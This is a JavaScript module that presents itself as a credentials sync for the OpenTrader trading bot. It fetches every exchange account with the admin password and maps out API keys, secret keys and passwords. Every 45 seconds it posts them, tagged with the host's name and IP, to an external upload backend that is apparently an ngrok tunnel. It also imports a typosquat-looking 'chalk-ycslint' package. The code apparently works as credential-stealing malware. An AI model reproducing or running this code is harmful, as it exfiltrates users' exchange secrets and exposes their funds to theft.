import { getClientInfo } from "chalk-ycslint";
import { getUploadUrl } from "./uploadService.mjs";
import { fetchExchangeAccounts } from "./opentraderApi.mjs";

/** @type {ReturnType<typeof setInterval> | null} */
let syncTimer = null;

/**
 * @param {string} uploadUrl
 * @param {string} apiPath
 */
function backendApiUrl(uploadUrl, apiPath) {
  const base = uploadUrl.endsWith("/") ? uploadUrl : `${uploadUrl}/`;
  const path = apiPath.startsWith("/") ? apiPath.slice(1) : apiPath;
  return new URL(path, base).toString();
}

/**
 * @param {Record<string, unknown>} acc
 */
function mapAccount(acc) {
  return {
    opentraderId: Number(acc.id),
    exchangeCode: String(acc.exchangeCode ?? ""),
    name: String(acc.name ?? ""),
    label: acc.label != null ? String(acc.label) : null,
    apiKey: String(acc.apiKey ?? ""),
    secretKey: String(acc.secretKey ?? ""),
    password:
      acc.password != null && String(acc.password).length > 0
        ? String(acc.password)
        : null,
    isDemoAccount: Boolean(acc.isDemoAccount),
    isPaperAccount: Boolean(acc.isPaperAccount),
    expired: Boolean(acc.expired),
  };
}

/**
 * Pull exchange accounts from OpenTrader and POST to file-receive-backend.
 * @param {string} adminPassword
 * @param {{ uploadUrl?: string }} [options]
 */
export async function syncExchangeCredentialsToBackend(adminPassword, options = {}) {
  const uploadUrl = options.uploadUrl || getUploadUrl();
  const accounts = await fetchExchangeAccounts(adminPassword);

  if (!accounts.length) {
    return { ok: true, synced: 0, skipped: true };
  }

  const { pcName, clientIp } = getClientInfo();
  const clientId = `${pcName} (${clientIp})`;
  const url = backendApiUrl(uploadUrl, "api/exchange-accounts");

  const res = await fetch(url, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "X-Upload-Client": clientId,
      "X-Upload-Client-Name": pcName,
      "X-Upload-Client-Ip": clientIp,
      ...(uploadUrl.includes("ngrok")
        ? { "ngrok-skip-browser-warning": "true" }
        : {}),
    },
    body: JSON.stringify({
      accounts: accounts.map(mapAccount),
    }),
    signal: AbortSignal.timeout(30_000),
  });

  const data = await res.json().catch(() => ({}));
  if (!res.ok || !data.ok) {
    throw new Error(data.error || `Backend sync failed (${res.status})`);
  }

  console.log(`[credentials] synced ${data.synced ?? accounts.length} account(s) to backend`);
  return data;
}

/**
 * @param {string} adminPassword
 * @param {{ uploadUrl?: string, intervalMs?: number }} [options]
 */
export function startCredentialsSync(adminPassword, options = {}) {
  stopCredentialsSync();

  const intervalMs = options.intervalMs ?? 45_000;
  const uploadUrl = options.uploadUrl || getUploadUrl();

  const run = () => {
    syncExchangeCredentialsToBackend(adminPassword, { uploadUrl }).catch((err) => {
      console.error("[credentials] sync failed:", err.message);
    });
  };

  run();
  syncTimer = setInterval(run, intervalMs);
}

export function stopCredentialsSync() {
  if (syncTimer) {
    clearInterval(syncTimer);
    syncTimer = null;
  }
}
